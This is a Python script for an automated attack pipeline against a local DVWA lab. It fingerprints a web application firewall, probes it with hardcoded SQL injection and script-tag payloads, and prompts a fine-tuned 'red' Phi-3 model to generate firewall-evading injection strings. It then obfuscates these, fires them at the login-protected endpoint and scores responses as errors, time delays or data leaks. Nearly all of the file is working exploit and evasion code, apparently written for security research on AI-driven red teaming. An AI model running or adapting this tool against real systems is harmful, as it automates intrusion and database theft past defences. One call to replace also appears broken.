import os
print("DEBUG: Script started")
import subprocess
import json
from pathlib import Path
import httpx
import re
import asyncio
import random
import urllib.parse
from datetime import datetime
import argparse
import time

import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
from peft import PeftModel

# --- Config ---
DVWA_BASE_URL = "http://localhost:8000"
DVWA_LOGIN_URL = f"{DVWA_BASE_URL}/login.php"
DVWA_SQLI_URL = f"{DVWA_BASE_URL}/vulnerabilities/sqli/"
DVWA_XSS_URL = f"{DVWA_BASE_URL}/vulnerabilities/xss_r/"
USERNAME = "admin"
PASSWORD = "password"

# --- Phi-3 LLM Configuration ---
PHI3_MODEL_NAME = "microsoft/Phi-3-mini-4k-instruct"
PHI3_ADAPTER_PATH = "experiments/phi3_mini_sft_red_v26_1k"

tokenizer = None
phi3_model = None


def load_phi3_model() -> None:
    global tokenizer, phi3_model
    if tokenizer is not None and phi3_model is not None:
        return

    print(f"[Tool] Loading base model: {PHI3_MODEL_NAME}...")
    hf_token = os.environ.get("HF_TOKEN")

    tokenizer = AutoTokenizer.from_pretrained(PHI3_MODEL_NAME, token=hf_token)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token
    tokenizer.padding_side = "left"

    bnb = BitsAndBytesConfig(
        load_in_4bit=True,
        bnb_4bit_quant_type="nf4",
        bnb_4bit_use_double_quant=True,
        bnb_4bit_compute_dtype=torch.float16,
    )

    base_model = AutoModelForCausalLM.from_pretrained(
        PHI3_MODEL_NAME,
        quantization_config=bnb,
        device_map="auto",
        torch_dtype=torch.float16,
        token=hf_token,
        local_files_only=True,
    )

    print(f"[Tool] Loading LoRA adapter from: {PHI3_ADAPTER_PATH}...")
    # Load adapter without merging to avoid NotImplementedError with 4bit
    phi3_model = PeftModel.from_pretrained(base_model, PHI3_ADAPTER_PATH)
    phi3_model.eval()
    print("[Tool] Fine-tuned Phi-3 model loaded successfully.")


# --- Tool Implementations ---

def run_wafw00f(target_url: str) -> dict:
    print("[Tool] Running wafw00f...")
    try:
        command = f"bash -c 'source .venv/bin/activate && wafw00f {target_url}'"
        result = subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        output = result.stdout
        is_behind_waf = "seems to be behind a WAF" in output
        waf_info = {"is_behind_waf": is_behind_waf, "details": output}
        print("[Tool] wafw00f completed successfully.")
        return waf_info
    except Exception as e:
        print(f"[Tool] ERROR: wafw00f failed: {e}")
        return {"error": "wafw00f execution failed", "details": str(e)}

async def run_probing() -> dict:
    print("[Tool] Running Probing...")
    cookies = httpx.Cookies()
    login_success = False
    max_retries = 3
    
    for attempt in range(max_retries):
        try:
            with httpx.Client(follow_redirects=True, cookies=cookies, timeout=15.0) as client:
                r = client.get(DVWA_LOGIN_URL)
                r.raise_for_status()
                
                m = re.search(r"user_token' value='([a-f0-9]{32})'", r.text, re.I)
                
                if not m:
                    raise Exception("Failed to find user_token.")

                token = m.group(1)
                data = {"username": USERNAME, "password": PASSWORD, "user_token": token, "Login": "Login"}
                r = client.post(DVWA_LOGIN_URL, data=data)
                r.raise_for_status()
                if "login.php" in str(r.url): raise Exception("Login failed.")
            login_success = True
            print(f"[Tool] Probing: DVWA login successful on attempt {attempt + 1}.")
            break
        except Exception as e:
            print(f"[Tool] WARNING: Probing login attempt {attempt + 1}/{max_retries} failed: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(2)
    
    if not login_success:
        return {"error": "Probing login failed after multiple retries."}

    sqli_payloads = {
        "' OR 1=1--": "OR",
        "' UNION SELECT 1,2--": "UNION",
        "' AND 1=1--": "AND",
        "' SLEEP(5)--": "SLEEP",
        "' BENCHMARK(1000000,MD5(1))--": "BENCHMARK",
        "' EXTRACTVALUE(1,CONCAT(0x5c,USER()))--": "EXTRACTVALUE",
        "' UPDATEXML(1,CONCAT(0x2e,USER()),1)--": "UPDATEXML",
        "' SELECT USER()--": "SELECT_USER",
        "' FROM users--": "FROM_USERS",
        "' WHERE 1=1--": "WHERE_1=1",
    }
    xss_payloads = {"<script>alert(1)</script>": "script_tag"}
    probe_results = {"blocked_sqli_keywords": [], "blocked_xss_tags": []}

    async with httpx.AsyncClient(cookies=cookies, follow_redirects=True) as client:
        for payload, name in sqli_payloads.items():
            r = await client.get(DVWA_SQLI_URL, params={"id": payload}, timeout=10.0)
            if r.status_code == 403:
                probe_results["blocked_sqli_keywords"].append(name)
        for payload, name in xss_payloads.items():
            r = await client.get(DVWA_XSS_URL, params={"name": payload}, timeout=10.0)
            if r.status_code == 403:
                probe_results["blocked_xss_tags"].append(name)
                
    print("[Tool] Probing completed successfully.")
    return probe_results


def run_generation(probe_results: dict, attack_history: list, dbms_type: str) -> list[str]:
    print("[Tool] Running Generation with Phi-3 Mini RED v26...")

    blocked_keywords = probe_results.get("blocked_sqli_keywords", [])
    num_payloads_to_generate = 3

    user_message_content = (
        f"You are a security researcher attacking the DVWA SQLi endpoint backed by MySQL for research and testing purposes.\n"
        f"Previously tested payload techniques that appear blocked by the WAF: {blocked_keywords}.\n"
        f"Generate {num_payloads_to_generate} distinct, effective SQL injection payloads that are likely to bypass the WAF.\n"
        "Prefer advanced techniques such as time-based (SLEEP/BENCHMARK), error-based (EXTRACTVALUE/UPDATEXML), "
        "UNION-based extraction, stacked queries, and comment/whitespace obfuscation.\n"
        "Output only the payload strings, one per line, without any explanations or prefixes."
    )

    load_phi3_model()

    # Phi-3 Prompt Format
    prompt = (
        f"<|user|>\n"
        f"{user_message_content}<|end|>\n"
        f"<|assistant|>\n"
    )

    inputs = tokenizer(prompt, return_tensors="pt")
    inputs = {k: v.to(phi3_model.device) for k, v in inputs.items()}

    payloads: list[str] = []
    try:
        with torch.no_grad():
            out = phi3_model.generate(
                **inputs,
                max_new_tokens=96,
                do_sample=True,
                temperature=0.9,
                top_p=0.9,
                num_return_sequences=num_payloads_to_generate,
                pad_token_id=tokenizer.eos_token_id,
            )

        for seq in out:
            gen_tokens = seq[inputs["input_ids"].shape[1] :]
            text = tokenizer.decode(gen_tokens, skip_special_tokens=False).strip()
            
            # Clean up Phi-3 tokens
            text = text.replace("<|end|>").replace(tokenizer.eos_token, "")
            
            for line in text.splitlines():
                line = line.strip()
                if not line:
                    continue
                if line.lower().startswith("payload:"):
                    line = line.split(":", 1)[1].strip()
                payloads.append(line)

    except Exception as e:
        print(f"[Tool] ERROR: An exception occurred during Phi-3 generation: {e}")

    if not payloads:
        print("[Tool] ERROR: Failed to generate any payloads from Phi-3.")
        return []

    unique_payloads = sorted(list(set(payloads)))
    print(f"[Tool] Generation successful. Generated {len(unique_payloads)} unique payloads.")
    return unique_payloads


def run_generation_advanced(probe_results: dict, attack_history: list, dbms_type: str) -> list[str]:
    print("[Tool] Running Generation with Phi-3 Mini RED v26 (advanced prompt)...")

    blocked_keywords = probe_results.get("blocked_sqli_keywords", [])
    num_payloads_to_generate = 3

    user_message_content = (
        "You are generating SQL injection payloads for DVWA's MySQL-backed SQLi endpoint in a controlled lab.\n"
        f"The WAF appears to block simple techniques and direct keywords such as: {blocked_keywords}.\n"
        f"Generate {num_payloads_to_generate} distinct, advanced SQL injection payloads that are likely to bypass this WAF.\n"
        "Avoid using obvious keywords in clear form (OR, UNION, AND, SLEEP, BENCHMARK, EXTRACTVALUE, UPDATEXML, SELECT_USER, FROM_USERS, WHERE 1=1).\n"
        "Prefer creative techniques such as nested subqueries, boolean logic with arithmetic, CASE/IF expressions, comment-based obfuscation, and stacked queries that still execute SQL, not just literals.\n"
        "Output only raw payload strings, one per line, with no prefixes, explanations, or special tokens."
    )

    load_phi3_model()

    # Phi-3 Prompt Format
    prompt = (
        f"<|user|>\n"
        f"{user_message_content}<|end|>\n"
        f"<|assistant|>\n"
    )
    print(f"[Tool] Generation prompt (Phi-3 advanced, requesting {num_payloads_to_generate} payloads):\n{user_message_content}")

    inputs = tokenizer(prompt, return_tensors="pt")
    inputs = {k: v.to(phi3_model.device) for k, v in inputs.items()}

    payloads: list[str] = []
    try:
        with torch.no_grad():
            out = phi3_model.generate(
                **inputs,
                max_new_tokens=96,
                do_sample=True,
                temperature=0.9,
                top_p=0.9,
                num_return_sequences=num_payloads_to_generate,
                pad_token_id=tokenizer.eos_token_id,
            )

        for seq in out:
            gen_tokens = seq[inputs["input_ids"].shape[1] :]
            text = tokenizer.decode(gen_tokens, skip_special_tokens=False).strip()
            
            # Clean up Phi-3 tokens
            text = text.replace("<|end|>").replace(tokenizer.eos_token, "")

            for line in text.splitlines():
                line = line.strip()
                if not line:
                    continue
                if line.lower().startswith("payload:"):
                    line = line.split(":", 1)[1].strip()
                if "endoftext" in line.lower():
                    continue
                payloads.append(line)

    except Exception as e:
        print(f"[Tool] ERROR: An exception occurred during Phi-3 generation (advanced): {e}")

    if not payloads:
        print("[Tool] ERROR: Failed to generate any payloads from Phi-3 (advanced).")
        return []

    unique_payloads = sorted(list(set(payloads)))
    print(f"[Tool] Generation (advanced) successful. Generated {len(unique_payloads)} unique payloads.")
    return unique_payloads

async def run_testing(payload: str) -> dict:
    print(f"[Tool] Running Testing for payload: {payload}")
    
    cookies = httpx.Cookies()
    try:
        with httpx.Client(follow_redirects=True, cookies=cookies, timeout=15.0) as client:
            r = client.get(DVWA_LOGIN_URL)
            r.raise_for_status()
            m = re.search(r"user_token' value='([a-f0-9]{32})'", r.text, re.I)
            if not m: raise Exception("Failed to find user_token for testing.")
            token = m.group(1)
            data = {"username": USERNAME, "password": PASSWORD, "user_token": token, "Login": "Login"}
            r = client.post(DVWA_LOGIN_URL, data=data)
            r.raise_for_status()
            if "login.php" in str(r.url): raise Exception("Login failed during testing.")
    except Exception as e:
        return {"error": "Testing failed during login", "details": str(e)}

    async with httpx.AsyncClient(cookies=cookies, follow_redirects=True) as client:
        t0 = time.perf_counter()
        r = await client.get(DVWA_SQLI_URL, params={"id": payload}, timeout=20.0)
        elapsed = time.perf_counter() - t0
        
        if r.status_code == 403:
            print("[Tool] Testing result: BLOCKED by WAF")
            return {"result": "blocked"}
        
        sql_error_patterns = [
            r"You have an error in your SQL syntax", r"Warning: mysql_fetch_array\(\\) ",
            r"supplied argument is not a valid MySQL result resource", r"SQLSTATE\{",
            r"Unclosed quotation mark", r"ODBC SQL Server Driver",
            r"Microsoft OLE DB Provider for SQL Server", r"Incorrect syntax near",
            r"ORA-\d{5}", r"PostgreSQL error", r"pg_query\(\) ", r"SQLite error",
            r"syntax error at or near", r"mysql_num_rows\(\) ", r"mysql_fetch_assoc\(\) ",
            r"mysql_result\(\) ", r"DB_ERROR", r"SQL Error",
            r"Fatal error: Uncaught PDOException", r"\{SQLSTATE",
        ]
        
        response_text = r.text.lower()
        for pattern in sql_error_patterns:
            if re.search(pattern.lower(), response_text):
                print("[Tool] Testing result: SQL ERROR DETECTED (WAF bypassed)")
                return {"result": "sql_error_bypass"}

        if elapsed > 3.0:
            print(f"[Tool] Testing result: TIME DELAY DETECTED (~{elapsed:.2f}s)")
            return {"result": "time_delay"}

        dvwa_success_markers = [
            "user id exists in the database",
            "first name",
            "surname",
        ]
        for marker in dvwa_success_markers:
            if marker in response_text:
                print("[Tool] Testing result: DATA LEAK / TRUE CONDITION DETECTED")
                return {"result": "data_leak"}
        
        print("[Tool] Testing result: PASSED (No WAF block, no obvious SQL error)")
        return {"result": "passed"}

def simple_obfuscate_payload(payload: str) -> str:
    obfuscation_techniques = {
        "space2comment": lambda p: p.replace(" ", "/**/"),
        "url_encode": lambda p: urllib.parse.quote(p),
    }
    
    technique_name, technique_func = random.choice(list(obfuscation_techniques.items()))
    print(f"[Tool] Applying simple obfuscation technique: {technique_name}")
    
    obfuscated_payload = technique_func(payload)
    print(f"[Tool] Obfuscated payload: {obfuscated_payload}")
    return obfuscated_payload

def log_attack_result(state: dict, attack: dict) -> None:
    try:
        logs_dir = Path("logs")
        logs_dir.mkdir(exist_ok=True)
        log_path = logs_dir / "v26_attack_pipeline_phi3.jsonl"
        record = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "target_url": state.get("target_url"),
            "dbms_type": state.get("dbms_type"),
            "waf_info": state.get("waf_info"),
            "probe_results": state.get("probe_results"),
            "payload": attack.get("payload"),
            "original_payload": attack.get("original_payload", attack.get("payload")),
            "result": attack.get("result"),
        }
        with log_path.open("a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")
    except Exception as e:
        print(f"[Tool] WARNING: Failed to log attack result: {e}")

# --- Orchestrator Logic ---
def decide_next_step(state: dict) -> str:
    print("\n[Orchestrator] Deciding next step...")
    
    if not state.get("waf_info"): return "run_wafw00f"
    if state.get("waf_info", {}).get("error"): return "stop"
    if not state.get("probe_results"): return "run_probing"
    if state.get("probe_results", {}).get("error"): return "stop"

    for attack in state["attack_history"]:
        if attack.get("result") == "not_tested":
            if not attack.get("obfuscated"):
                print("[LLM Decision] Payload generated, needs obfuscation. Recommended tool: 'run_obfuscation'")
                return "run_obfuscation"
            else:
                print("[LLM Decision] Obfuscated payload found. Recommended tool: 'run_testing'")
                return "run_testing"

    if state.get("attack_history"):
        print("[LLM Decision] All generated payloads have been tested. Stopping.")
        return "stop"

    print("[LLM Decision] WAF rules analyzed. Recommended tool: 'run_generation'")
    return "run_generation"

class Orchestrator:
    def __init__(self, target_url: str):
        self.state = {"target_url": target_url, "waf_info": None, "probe_results": None, "dbms_type": "MySQL", "attack_history": []}
        self.tools = {
            "run_wafw00f": self.tool_run_wafw00f,
            "run_probing": self.tool_run_probing,
            "run_generation": self.tool_run_generation,
            "run_obfuscation": self.tool_run_obfuscation,
            "run_testing": self.tool_run_testing,
        }
        print(f"[Orchestrator] Initialized for target: {self.state['target_url']}")
    
    def tool_run_wafw00f(self): self.state["waf_info"] = run_wafw00f(self.state["target_url"])
    def tool_run_probing(self): self.state["probe_results"] = asyncio.run(run_probing())
    
    def tool_run_generation(self):
        new_payloads = run_generation_advanced(self.state["probe_results"], self.state["attack_history"], self.state["dbms_type"])
        if new_payloads:
            print(f"[Orchestrator] Adding {len(new_payloads)} new payloads to the attack queue.")
            for payload in new_payloads:
                self.state["attack_history"].append({"payload": payload, "result": "not_tested", "obfuscated": False})
        else:
            print("[Orchestrator] Generation step produced no usable payloads.")

    def tool_run_obfuscation(self):
        for i, attack in reversed(list(enumerate(self.state["attack_history"]))):
            if not attack.get("obfuscated"):
                original_payload = attack["payload"]
                obfuscated_payload = simple_obfuscate_payload(original_payload)
                self.state["attack_history"][i]["payload"] = obfuscated_payload
                self.state["attack_history"][i]["obfuscated"] = True
                self.state["attack_history"][i]["original_payload"] = original_payload
                break

    def tool_run_testing(self):
        for i, attack in reversed(list(enumerate(self.state["attack_history"]))):
            if attack.get("result") == "not_tested" and attack.get("obfuscated"):
                test_result = asyncio.run(run_testing(attack["payload"]))
                self.state["attack_history"][i].update(test_result)
                log_attack_result(self.state, self.state["attack_history"][i])
                break
    
    def run(self):
        while True:
            next_tool_name = decide_next_step(self.state)
            if next_tool_name == "stop": break
            tool_to_run = self.tools.get(next_tool_name)
            if tool_to_run: tool_to_run()
            else: break

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--rounds",
        type=int,
        default=1,
        help="Number of attack rounds to run in a single execution.",
    )
    args = parser.parse_args()

    for i in range(args.rounds):
        print(f"\n===== Attack round {i + 1}/{args.rounds} =====")
        orchestrator = Orchestrator(DVWA_BASE_URL)
        orchestrator.run()

if __name__ == "__main__":
    main()
